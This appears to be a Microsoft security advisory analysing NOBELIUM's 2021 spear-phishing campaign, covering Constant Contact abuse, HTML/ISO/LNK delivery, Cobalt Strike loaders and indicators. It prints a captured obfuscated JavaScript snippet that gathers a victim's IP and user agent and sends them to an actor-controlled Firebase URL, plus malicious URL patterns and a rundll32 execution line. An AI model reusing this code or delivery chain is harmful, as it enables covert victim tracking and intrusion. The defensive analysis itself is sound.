The campaign, initially observed and tracked by Microsoft since January 2021, evolved over a series of waves\ndemonstrating significant experimentation. On May 25, 2021, the campaign escalated as NOBELIUM leveraged the legitimate mass[mailing service, Constant Contact, to masquerade as a US-based development organization and distribute malicious URLs to a wide](https://www.constantcontact.com/)\nvariety of organizations and industry verticals.\n\nMicrosoft is issuing this alert and new security research regarding this sophisticated email-based campaign that NOBELIUM has been\noperating to help the industry understand and protect from this latest activity. Below, we have outlined attacker motives, malicious\n[behavior, and best practices to protect against this attack. You can also find more information on the Microsoft On The Issues blog.](https://blogs.microsoft.com/on-the-issues/?p=64692)\n\nNote: This is an active incident. We will post more details here as they become available.\n\n**_[Update [05/28/2021]: We published a new blog post detailing NOBELIUM’s latest early-stage toolset, composed of four tools utilized in a](https://www.microsoft.com/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/)_**\n_unique infection chain: EnvyScout, BoomBox, NativeZone, and VaporRage._\n\nNOBELIUM has historically targeted government organizations, non-government organizations (NGOs), think tanks, military, IT\nservice providers, health technology and research, and telecommunications providers. With this latest attack, NOBELIUM attempted to\n[target approximately 3,000 individual accounts across more than 150 organizations, employing an established pattern of using unique](https://msrc-blog.microsoft.com/2020/12/21/december-21st-2020-solorigate-resource-center/)\ninfrastructure and tooling for each target, increasing their ability to remain undetected for a longer period of time.\n\nThis new wide-scale email campaign leverages the legitimate service Constant Contact to send malicious links that were obscured\nbehind the mailing service’s URL (many email and document services provide a mechanism to simplify the sharing of files, providing\ninsights into who and when links are clicked). Due to the high volume of emails distributed in this campaign, automated email threat\n\n\n-----\n\ndetection systems blocked most of the malicious emails and marked them as spam. However, some automated threat detection systems\nmay have successfully delivered some of the earlier emails to recipients either due to configuration and policy settings or prior to\ndetections being in place.\n\nDue to the fast-moving nature of this campaign and its perceived scope, Microsoft encourages organizations to investigate and monitor\ncommunications matching characteristics described in this report and take the actions described below in this article.\n\n[We continue to see an increase in sophisticated and nation-state-sponsored attacks and, as part of our ongoing threat research and](https://blogs.microsoft.com/on-the-issues/2021/03/02/new-nation-state-cyberattacks/)\n[efforts to protect customers, we will continue to provide guidance to the security community on how to secure against and respond to](https://blogs.microsoft.com/on-the-issues/2020/12/13/customers-protect-nation-state-cyberattacks/)\nthese multi-dimensional attacks.\n\n## Spear-phishing campaign delivers NOBELIUM payloads\n\nThe NOBELIUM campaign observed by MSTIC and detailed in this blog differs significantly from the NOBELIUM operations that ran\nfrom September 2019 until January 2021, which included the compromise of the SolarWinds Orion platform. It is likely that these\nobservations represent changes in the actor’s tradecraft and possible experimentation following widespread disclosures of previous\nincidents.\n\n### Early testing and initial discovery\n\nAs part of the initial discovery of the campaign in February, MSTIC identified a wave of phishing emails that leveraged the Google\nFirebase platform to stage an ISO file containing malicious content, while also leveraging this platform to record attributes of those who\naccessed the URL. MSTIC traced the start of this campaign to January 28, 2021, when the actor was seemingly performing early\nreconnaissance by only sending the tracking portion of the email, leveraging Firebase URLs to record targets who clicked. No delivery of\na malicious payload was observed during this early activity.\n\n### Evolving delivery techniques\n\nIn the next evolution of the campaign, MSTIC observed NOBELIUM attempting to compromise systems through an HTML file attached\nto a spear-phishing email. When opened by the targeted user, a JavaScript within the HTML wrote an ISO file to disc and encouraged\nthe target to open it, resulting in the ISO file being mounted much like an external or network drive. From here, a shortcut file (LNK)\n\n\n-----\n\nwould execute an accompanying DLL, which would result in Cobalt Strike Beacon executing on the system.\n\n_Figure 1. Example Flow of HMTL/ISO infection chain._\n\nHere’s an example of target fingerprinting code leveraging Firebase:\n```\ntry {\nlet sdfgfghj = '';\nlet kjhyui = new XMLHttpRequest();\nkjhyui.open('GET', 'https://api.ipify.org/?format=jsonp?callback=?', false);\nkjhyui.onreadystatechange = function (){\nsdfgfghj = this.responseText;\n}\n\n```\n\n-----\n\n```\nkjhyui.send(null);\nlet ioiolertsfsd = navigator.userAgent;\nlet uyio = window.location.pathname.replace('/','');\nvar ctryur = {'io':ioiolertsfsd,'tu':uyio,'sd':sdfgfghj};\nctryur = JSON.stringify(ctryur);\nlet sdfghfgh = new XMLHttpRequest();\nsdfghfgh.open('POST', 'https://eventbrite-com-default-rtdb.firebaseio.com/root.json', false);\nsdfghfgh.setRequestHeader('Content-Type', 'application/json');\nsdfghfgh.send(ctryur);\n} catch (e) {}\n\n```\nSimilar spear-phishing campaigns were detected throughout March, which included the NOBELIUM actor making several alterations to\nthe accompanying HTML document based on the intended target. MSTIC also observed the actor experimenting with removing the ISO\nfrom Firebase, and instead encoding it within the HTML document. Similarly, the actor experimented with redirecting the HTML\ndocument to an ISO, which contained an RTF document, with the malicious Cobalt Strike Beacon DLL encoded within the RTF. In one\nfinal example of experimentation, there was no accompanying HTML in the phishing email and instead a URL led to an independent\nwebsite spoofing the targeted organizations, from where the ISO was distributed.\n\nThe phishing message and delivery method was not the only evolving factor in the campaign. In one of the more targeted waves, no ISO\npayload was delivered, but additional profiling of the target device was performed by an actor-controlled web server after a user clicked\nthe link. If the device targeted was an Apple iOS device, the user was redirected to another server under NOBELIUM control, where the\nsince-patched zero-day exploit for CVE-2021-1879 was served.\n\n### Escalated targeting and delivery\n\nExperimentation continued through most of the campaign but began to escalate in April 2021. During the waves in April, the actor\nabandoned the use of Firebase, and no longer tracked users using a dedicated URL. Their techniques shifted to encode the ISO within\nthe HTML document and have that responsible for storing target host details on a remote server via the use of the api.ipify.org service.\nThe actor sometimes employed checks for specific internal Active Directory domains that would terminate execution of the malicious\nprocess if it identified an unintended environment.\n\n\n-----\n\nIn May 2021, the actor changed techniques once more by maintaining the HTML and ISO combination, but dropped a custom .NET\nfirst-stage implant, detected as TrojanDownloader:MSIL/BoomBox, that reported host-based reconnaissance data to, and downloaded\nadditional payloads from, the Dropbox cloud storage platform.\n\nOn May 25, the NOBELIUM campaign escalated significantly. Using the legitimate mass mailing service Constant Contact, NOBELIUM\nattempted to target around 3,000 individual accounts across more than 150 organizations. Due to the high-volume campaign,\nautomated systems blocked most of the emails and marked them as spam. However, automated systems might have successfully\ndelivered some of the earlier emails to recipients.\n\nIn the May 25 campaign, there were several iterations. In one example the emails appear to originate from USAID\n_<ashainfo@usaid.gov>, while having an authentic sender email address that matches the standard Constant Contact service. This_\naddress (which varies for each recipient) ends in @in.constantcontact.com, and (which varies for each recipient), and a Reply-To\naddress of <mhillary@usaid.gov> was observed. The emails pose as an alert from USAID, as seen below.\n\n\n-----\n\n-----\n\n_Figure 2. Example email screenshot._\n\n\n-----\n\nIf the user clicked the link on the email, the URL directs them to the legitimate Constant Contact service, which follows this pattern:\n\n_https://r20.rs6[.]net/tn.jsp?f=_\n\nThe user is then redirected to NOBELIUM-controlled infrastructure, with a URL following this pattern:\n\n_https://usaid.theyardservice[.]com/d/<target_email_address>_\n\nA malicious ISO file is then delivered to the system. Within this ISO file are the following files that are saved in the\n_%USER%\\AppData\\Local\\Temp\\<random folder name>\\ path:_\n\nA shortcut, such as Reports.lnk, that executes a custom Cobalt Strike Beacon loader\nA decoy document, such as ica-declass.pdf, that is displayed to the target\nA DLL, such as Document.dll, that is a custom Cobalt Strike Beacon loader dubbed NativeZone by Microsoft\n\n\n-----\n\n_Figure 3. ISO file contents. It is worth noting that the “Documents.dll” is a hidden file._\n\n\n-----\n\n-----\n\n_Figure 4. Shortcut which executes the hidden DLL file._\n\nThe end result when detonating the LNK file is the execution of “C:\\Windows\\system32\\rundll32.exe Documents.dll,Open”.\n\nThe successful deployment of these payloads enables NOBELIUM to achieve persistent access to compromised systems. Then, the\nsuccessful execution of these malicious payloads could enable NOBELIUM to conduct action-on objectives, such as lateral movement,\ndata exfiltration, and delivery of additional malware.\n\nIndicators of compromise (IOCs) for the campaign occurring on May 25 are provided in this blog to help security teams to identify actor\nactivity.\n\nMicrosoft security researchers assess that the NOBELIUM’s spear-phishing operations are recurring and have increased in frequency\nand scope. It is anticipated that additional activity may be carried out by the group using an evolving set of tactics.\n\n[Microsoft continues to monitor this threat actor’s evolving activities and will update as necessary.
